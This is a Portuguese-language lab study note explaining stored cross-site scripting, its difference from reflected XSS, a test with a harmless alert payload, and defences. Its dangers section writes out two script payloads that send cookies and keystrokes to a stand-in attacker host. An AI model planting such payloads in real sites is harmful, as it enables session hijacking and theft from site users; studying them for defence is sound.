[[4 - LABS- XSS - Cross-site scripting (Stored)]]
### O que é **XSS Stored** (Cross-Site Scripting Armazenado)?

**XSS Stored** é uma vulnerabilidade onde o atacante **injeta scripts maliciosos** (geralmente em **JavaScript**) em um site, e **esses scripts são armazenados permanentemente** pelo servidor (em banco de dados, arquivos, etc). Depois, quando outro usuário acessa a página, o script é **executado automaticamente no navegador** da vítima.

---

### Diferença entre Reflected e Stored

|Tipo de XSS|Como Funciona|Necessita Engenharia Social?|Alcança vários usuários?|
|---|---|---|---|
|**Reflected**|O script está no link. A vítima precisa clicar nesse link.|Sim|Não|
|**Stored**|O script é armazenado no servidor (ex: comentário, post, etc).|Não|Sim|

---

### Exemplo prático (como você mencionou):

1. Você acessa um campo de **comentário** em um site.
    
2. O site **exibe os comentários salvos no banco de dados** sempre que recarrega a página.
    
3. Você testa HTML simples, como:
    
    ```html
    <b>Olá eu estou em negrito</b>
    ```
    
    E ele mostra corretamente, ou seja, o site **não está filtrando** HTML (isso já é um sinal de alerta para HTML Injection).
    
4. Você testa agora com um **script malicioso**:
    
    ```html
    <script>alert("Olá, triggamos um XSS Stored")</script>
    ```
    
    - Ao postar, talvez **nada aconteça imediatamente**.
        
    - Mas ao dar F5 ou outro usuário acessar, o **alerta aparece**, o que significa que o **script foi salvo no banco de dados e executado no navegador** da vítima — esse é um XSS Stored confirmado.
        

---

### Perigos do XSS Stored

- Roubo de cookies/session tokens:
    
    ```js
    <script>fetch("https://attacker.com/cookie?c=" + document.cookie)</script>
    ```
    
- Keyloggers:
    
    ```js
    <script>
      document.onkeypress = function(e) {
        fetch('https://attacker.com/log?key=' + e.key);
      }
    </script>
    ```
    
- Redirecionamento malicioso, defacement do site, execução de payloads complexos, etc.
    

---

### Como proteger?

- **Escapar ou remover tags HTML** perigosas (`<script>`, `<img onerror>`, etc.).
    
- Usar **Content Security Policy (CSP)**.
    
- Validar e sanitizar **dados de entrada** e de **saída**.
    
- Evitar exibir conteúdo do usuário como **HTML**, a menos que seja seguro.